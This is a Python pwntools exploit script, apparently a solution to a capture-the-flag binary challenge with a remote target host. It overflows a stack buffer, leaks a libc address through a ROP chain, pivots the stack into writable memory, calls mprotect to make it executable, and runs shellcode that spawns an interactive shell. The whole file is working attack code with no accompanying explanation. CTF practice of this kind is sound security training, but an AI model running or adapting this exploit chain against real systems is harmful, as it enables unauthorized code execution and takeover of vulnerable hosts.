from pwn import *

def shell_code_gen():
	context.arch = "amd64"
	return asm(shellcraft.amd64.sh())

def get_libc_base_addr(pop_rdx):
	raw = target.recv(6).ljust(8, b"\x00")
	
	libc_start_main = u64(raw)
	libc_base = libc_start_main  - libc.symbols['__libc_start_main']

	log.info("The libc base address: " + hex(libc_base))
	log.info("pop rdx libc gadget (real " + hex(pop_rdx + libc_base) + ", offset " + hex(pop_rdx) + ")")

	return libc_base

def start_process(rem):
	if(rem):
		return remote('challs.xmas.htsp.ro', 2001)
	else:
		p = process("./chall", env = {"LD_PRELOAD": "./libc.so.6"})
		input("rrrrrrrrrrrrrrr ")
		return p

def send_payloads(target):
	pop_rdi         = 0x00000000004008e3
	pop_rsp         = 0x00000000004008dd
	pop_rdx         = 0x0000000000001b96
	real_pop_rsi    = 0x0000000000023eea
	pop_rsi         = 0x00000000004008e1
	libc_start_main = 0x0000000000600FF0
	mprotect_plt    = 0x0000000000400650
	gets_plt        = 0x0000000000400630
	puts_plt        = 0x400600
	got_libc_main   = 0x0000000000600FF0
	data            = 0x0000000000601058
	
	payload = b''
	payload += b"A" * 72
	payload += p64(pop_rdi) + p64(got_libc_main) + p64(puts_plt)
	payload += p64(pop_rdi) + p64(data) + p64(gets_plt)
	payload += p64(pop_rsp) + p64(data)
	
	target.sendline(payload)
	
	shell_code = shell_code_gen()
	libc_base = get_libc_base_addr(pop_rdx)

	payload1 = b""
	payload1 += b"\x90" * 8 + b"B" * 8 + b"C" * 8
	payload1 += p64(pop_rdx + libc_base)
	payload1 += p64(0x7)
	payload1 += p64(real_pop_rsi + libc_base)
	payload1 += p64(0x10000)
	payload1 += p64(pop_rdi)
	payload1 += p64(0x601000)
	payload1 += p64(mprotect_plt)
	payload1 += p64(data + len(payload1) + 8)
	payload1 += shell_code

	target.sendline(payload1)

target = start_process(0)
	
print(target.recvuntil("Hi. How are you doing today, good sir? Ready for Christmas?\n").decode())
libc = ELF('./libc.so.6')

send_payloads(target)

target.interactive()